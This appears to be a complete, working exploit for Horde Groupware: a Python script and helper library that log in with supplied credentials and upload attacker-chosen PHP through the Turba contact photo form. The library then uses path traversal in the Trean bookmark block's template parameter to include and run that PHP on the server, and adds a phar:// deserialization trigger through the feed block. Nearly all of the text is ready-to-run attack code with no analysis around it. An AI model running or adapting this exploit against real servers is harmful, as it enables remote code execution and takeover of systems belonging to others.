#!/usr/bin/env python3
from horde import Horde
import subprocess
import sys

TEMP_DIR = &#039;/tmp&#039;

if len(sys.argv) < 5:
    print(&#039;Usage: <base_url> <username> <password> <filename> <php_code>&#039;)
    sys.exit(1)

base_url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
filename = sys.argv[4]
php_code = sys.argv[5]

# log into the web application
horde = Horde(base_url, username, password)

# upload (delete manually) and evaluate the .inc file
horde.upload_to_tmp(&#039;{}.inc&#039;.format(filename), &#039;<?php {} die();&#039;.format(php_code))
horde.include_remote_inc_file(&#039;{}/{}&#039;.format(TEMP_DIR, filename))
## exploit-inc-inclusion.py EOF



## horde.py
import re
import requests

class Horde():
    def __init__(self, base_url, username, password):
        self.base_url = base_url
        self.username = username
        self.password = password
        self.session = requests.session()
        self.token = None
        self._login()

    def _login(self):
        url = &#039;{}/login.php&#039;.format(self.base_url)
        data = {
            &#039;login_post&#039;: 1,
            &#039;horde_user&#039;: self.username,
            &#039;horde_pass&#039;: self.password
        }
        response = self.session.post(url, data=data)
        token_match = re.search(r&#039;"TOKEN":"([^"]+)"&#039;, response.text)
        assert (
            len(response.history) == 1 and
            response.history[0].status_code == 302 and
            response.history[0].headers[&#039;location&#039;] == &#039;/services/portal/&#039; and
            token_match
        ), &#039;Cannot log in&#039;
        self.token = token_match.group(1)

    def upload_to_tmp(self, filename, data):
        url = &#039;{}/turba/add.php&#039;.format(self.base_url)
        files = {
            &#039;object[photo][img][file]&#039;: (None, filename),
            &#039;object[photo][new]&#039;: (&#039;x&#039;, data)
        }
        response = self.session.post(url, files=files)
        assert response.status_code == 200, &#039;Cannot upload the file to tmp&#039;

    def include_remote_inc_file(self, path):
        # vulnerable block (alternatively &#039;trean:trean_Block_Mostclicked&#039;)
        app = &#039;trean:trean_Block_Bookmarks&#039;

        # add one dummy bookmark (to be sure)
        url = &#039;{}/trean/add.php&#039;.format(self.base_url)
        data = {
            &#039;actionID&#039;: &#039;add_bookmark&#039;,
            &#039;url&#039;: &#039;x&#039;
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot add the bookmark&#039;

        # add bookmark block
        url = &#039;{}/services/portal/edit.php&#039;.format(self.base_url)
        data = {
            &#039;token&#039;: self.token,
            &#039;row&#039;: 0,
            &#039;col&#039;: 0,
            &#039;action&#039;: &#039;save-resume&#039;,
            &#039;app&#039;: app,
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot add the bookmark block&#039;

        # edit bookmark block
        url = &#039;{}/services/portal/edit.php&#039;.format(self.base_url)
        data = {
            &#039;token&#039;: self.token,
            &#039;row&#039;: 0,
            &#039;col&#039;: 0,
            &#039;action&#039;: &#039;save&#039;,
            &#039;app&#039;: app,
            &#039;params[template]&#039;: &#039;../../../../../../../../../../../&#039; + path
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot edit the bookmark block&#039;

        # evaluate the remote file
        url = &#039;{}/services/portal/&#039;.format(self.base_url)
        response = self.session.get(url)
        print(response.text)

        # remove the bookmark block so to not break the page
        url = &#039;{}/services/portal/edit.php&#039;.format(self.base_url)
        data = {
            # XXX token not needed here
            &#039;row&#039;: 0,
            &#039;col&#039;: 0,
            &#039;action&#039;: &#039;removeBlock&#039;
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot reset the bookmark block&#039;

    def trigger_phar(self, path):
        # vulnerable block (alternatively the same can be obtained by creating a
        # bookmark with the PHAR path and clocking on it)
        app = &#039;horde:horde_Block_Feed&#039;

        # add syndicated feed block
        url = &#039;{}/services/portal/edit.php&#039;.format(self.base_url)
        data = {
            &#039;token&#039;: self.token,
            &#039;row&#039;: 0,
            &#039;col&#039;: 0,
            &#039;action&#039;: &#039;save-resume&#039;,
            &#039;app&#039;: app,
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot add the syndicated feed block&#039;

        # edit syndicated feed block
        url = &#039;{}/services/portal/edit.php&#039;.format(self.base_url)
        data = {
            &#039;token&#039;: self.token,
            &#039;row&#039;: 0,
            &#039;col&#039;: 0,
            &#039;action&#039;: &#039;save&#039;,
            &#039;app&#039;: app,
            &#039;params[uri]&#039;: &#039;phar://{}&#039;.format(path)
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot edit the syndicated feed block&#039;

        # load the PHAR archive
        url = &#039;{}/services/portal/&#039;.format(self.base_url)
        response = self.session.get(url)

        # remove the syndicated feed block so to not break the page
        url = &#039;{}/services/portal/edit.php&#039;.format(self.base_url)
        data = {
            # XXX token not needed here
            &#039;row&#039;: 0,
            &#039;col&#039;: 0,
            &#039;action&#039;: &#039;removeBlock&#039;
        }
        response = self.session.post(url, data=data)
        assert response.status_code == 200, &#039;Cannot reset the syndicated feed block&#039;
## horde.py EOF

